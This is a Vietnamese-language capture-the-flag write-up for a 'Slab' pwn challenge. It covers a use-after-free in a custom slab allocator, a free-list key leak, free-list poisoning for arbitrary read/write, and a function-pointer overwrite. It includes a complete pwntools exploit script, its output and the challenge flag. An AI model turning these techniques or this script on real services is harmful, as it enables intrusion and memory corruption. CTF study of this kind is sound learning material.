---
title: "Slab"
category: "Pwn"
tags: ["uaf", "custom-allocator"]
solve_date: "2026-10-10T13:30:00+07:00"
language: "vi"
---

# Slab

**Flag:** `isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}`  
**Dịch vụ:** `nc 0.cloud.chals.io 20535` — attacked remote-only; no binary was supplied for this session

## Đề bài

Dịch vụ note store dùng custom slab allocator, 16 slot và object 96 byte. Không có binary đi kèm; cần quan sát service, leak layout rồi điều khiển routine report để đọc flag.

```text
slab store. commands: alloc | free <i> | edit <i> <hex> | read <i> | report | quit
```

## Phân tích

Sau free, slot vẫn đọc và ghi được: UAF cho cả read/write. Free ghi 8 byte metadata ở đầu object. Object đầu tiên được free vào list rỗng chứa `KEY ^ 0`, còn lần tiếp theo chứa `next_ptr ^ KEY`. XOR hai giá trị cho arena address. Key cố định theo listener process và được fork handler kế thừa, nhưng đổi khi listener restart.

   ```text
   stored_fd = KEY ^ next_object_pointer        (KEY = 8-byte global secret)
   ```

## Các hướng đã kiểm tra

Đây không phải glibc safe-linking: các object free vào list rỗng cho cùng key, và pointer trỏ vào static BSS. Read/edit đều bị giới hạn 96 byte, không có linear overflow sang object cạnh. report không phụ thuộc số note. e_shoff là file offset, không được dùng như virtual address. Không tái sử dụng key đã leak trước khi service restart.

## Lời giải

1. Allocate ba object, free chúng rồi read slot được free đầu để leak KEY của process hiện tại.
2. Sửa fd của freed object thành `KEY ^ target`. Allocator pop pointer không validate và ghi pointer đó vào slot table, tạo allocation tại target tùy chọn. Kiểm tra fd sau edit; không free slot đang trỏ vào read-only page.
3. Dùng read 96 byte để dump các segment đã load. ELF header cho biết non-PIE base 0x400000; program header xác định vùng mapped. Disassembly phần app tìm report function pointer ở `0x4b50d0`, đang trỏ `0x401d6c`.
4. Routine `0x4022e6` đọc flag.txt và in flag nhưng không được gọi qua command bình thường. Poison allocation tới report pointer, ghi địa chỉ routine này rồi gửi report.
5. Đối chiếu flag trả về qua các run. Overwrite nằm trong fork handler; connection sau vẫn thấy pointer mặc định.

| Read | What it showed |
|---|---|
| `0x400000` | ELF header: `ET_EXEC`, non-PIE, base `0x400000`, statically linked, `e_shoff = 0x370fa8` |
| `0x400040` | 10 program headers: `r-x 0x400000-0x4867fd`, `r-- 0x487000-0x4afbf0`, `rw- 0x4b09c8-0x4bd1e8` |
| `0x4b6000-0x4b9000` | the arena region — every object reads as zero in a fresh connection handler, no flag filed anywhere near the arena |
| `0x487240-0x488800` | `.rodata` of the app: `nothing to report.\n`, `no index slots\n`, `arena full\n`, `bad index\n`, `idx %d\n`, `0123456789abcdef`, **`flag.txt`**, `[chall] slab on 127.0.0.1:%d\n` |
| `0x401b00-0x402b20` | the app's own code, disassembled offline with capstone |

```text
alloc        ; helper object h          (writable arena memory)
free h       ; h is the list head again
edit h <p64(KEY ^ target)>              ; fd of h now decodes to `target`
alloc        ; pops h back into slot h
alloc        ; pops `target` -> table[i] == target
read i       ; 96 bytes at absolute address `target`
edit i <..>  ; 96 bytes of write at absolute address `target`
```

```nasm
; globals: flags[16] = 0x4b6ac0, table[16] = 0x4b6b00, list head = 0x4b6b80,
;          bump count = 0x4b6b88, KEY = 0x4b6b90, objects = 0x4b6ba0 + 96*i
; free i:  fd = head ^ KEY ; head = object ; flags[i] = 0 ; table[i] is NOT cleared
; alloc  :  if (head) { obj = head; head = *obj ^ KEY; } else { obj = 0x4b6ba0 + 96*count++; }
;           table[i] = obj                        ; raw pointer, unvalidated
; read i :  hex-dump 96 bytes at table[i]
```

```nasm
0x401ee2: jne 0x40225c              ; command != "report"
0x401ee8: call qword ptr [rip+0xb31e2]   ; -> call [0x4b50d0]   writable function pointer
```

```nasm
0x4022e6: entry, referenced by nothing in the command dispatch
0x402306: mov edi, 0x4872d4        ; "flag.txt"   -> call open(path, O_RDONLY)
0x40231e: mov rsi, rsp ; mov edx, 0xa0 -> call read(fd, buf, 160)
0x402369: mov rsi, rsp ; mov rdx, rax ; mov edi, [0x4b50c8] -> call write(connfd, buf, n)
```

## Kết quả

Service đã trả cùng flag trong ba lần đọc qua hai listener process.

```text
isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

## Tái hiện

Cần Python 3 và pwntools. Lưu script thành `slab_solve.py`. Capstone chỉ cần nếu làm lại bước dump/disassemble. Địa chỉ non-PIE giữ nguyên trong build đã quan sát; key phải leak lại theo process hiện tại.

```python
import re, struct, time
from pwn import remote

HOST, PORT = "0.cloud.chals.io", 20535
FN_REPORT_PTR = 0x4B50D0   # .data: `report` does  call qword ptr [0x4b50d0]
FN_FLAG = 0x4022E6         # open("flag.txt"); read(fd, buf, 160); write(connfd, buf, n)

u64 = lambda b: struct.unpack("<Q", b[:8])[0]
p64 = lambda v: struct.pack("<Q", v & (2 ** 64 - 1))


class Slab:
    def __init__(self):
        self.io = remote(HOST, PORT, timeout=15)
        self.io.recvline()
        self.io.recvuntil(b"> ", timeout=5)

    def cmd(self, line):
        self.io.sendline(line.encode() if isinstance(line, str) else line)
        time.sleep(0.05)
        return self.io.recvuntil(b"> ", timeout=8)[:-2].strip()

    def alloc(self):
        m = re.search(rb"idx (\d+)", self.cmd("alloc"))
        return int(m.group(1)) if m else None

    def free(self, i):
        return self.cmd("free %d" % i)

    def read(self, i):
        m = re.search(rb"data ([0-9a-f]+)", self.cmd("read %d" % i))
        return bytes.fromhex(m.group(1).decode()) if m else b""

    def edit(self, i, blob):
        return self.cmd("edit %d %s" % (i, blob.hex()))

    def leak_key(self):
        a, b, c = self.alloc(), self.alloc(), self.alloc()
        self.free(a)            # list was empty -> stored fd == KEY
        self.free(b)
        self.free(c)
        return u64(self.read(a)[:8])

    def slot_at(self, key, target):
        """Return a live index whose table pointer equals `target`."""
        h = self.alloc()
        self.free(h)
        want = p64(key ^ target)
        self.edit(h, want)
        assert self.read(h)[:8] == want, "fd write did not stick"
        assert self.alloc() == h, "helper was not re-popped"
        return self.alloc()     # pops `target`


def main():
    s = Slab()
    key = s.leak_key()
    print("[*] free-list key = 0x%016x" % key)

    slot = s.slot_at(key, FN_REPORT_PTR)
    original = u64(s.read(slot)[:8])
    print("[*] [0x%x] = 0x%x (default report handler)" % (FN_REPORT_PTR, original))
    assert 0x400000 <= original <= 0x4C0000, "unexpected pointer, refusing to corrupt"

    s.edit(slot, p64(FN_FLAG))
    print("[*] [0x%x] = 0x%x now" % (FN_REPORT_PTR, u64(s.read(slot)[:8])))
    print("[*] report -> %s" % s.cmd("report").decode(errors="replace"))
    s.io.close()


main()
```

```text
[*] free-list key = 0x618d5153e0045e29
[*] [0x4b50d0] = 0x401d6c (default report handler)
[*] [0x4b50d0] = 0x4022e6 now
[*] report -> isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}
```

## Hành vi dịch vụ đã quan sát

Hai probe dereference pointer sai từng khiến listener ngừng nhận kết nối khoảng 3,5 phút, sau đó supervisor khởi động lại và key đổi. Không chỉ connection riêng bị ảnh hưởng trong các probe đó. Kiểm tra pointer nằm trong arena trước khi allocator pop sẽ chặn cả primitive này và kiểu crash đã quan sát.
